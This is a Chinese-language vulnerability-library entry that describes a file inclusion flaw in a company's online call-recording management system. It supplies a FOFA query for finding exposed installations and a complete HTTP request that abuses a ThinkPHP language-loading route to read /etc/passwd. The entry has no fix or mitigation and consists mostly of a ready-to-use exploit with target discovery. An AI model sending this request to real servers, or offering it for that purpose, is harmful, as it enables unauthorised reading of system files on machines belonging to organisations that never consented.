# 申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞

# 一、漏洞简介
申瓯通信设备有限公司在线录音管理系统系统是一款全面的企业管理软件，涵盖多个领域，助力企业实现信息化管理和业务优化。申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞。

# 二、影响版本
+ 在线录音管理系统

# 三、资产测绘
+ fofa`title="在线录音管理系统"<font style="color:rgb(221, 17, 68);"></font>`


# 四、漏洞复现
```java
GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/etc/passwd HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Cache-Control: no-cache
Pragma: no-cache
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zdcq09yhyllgqpdn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
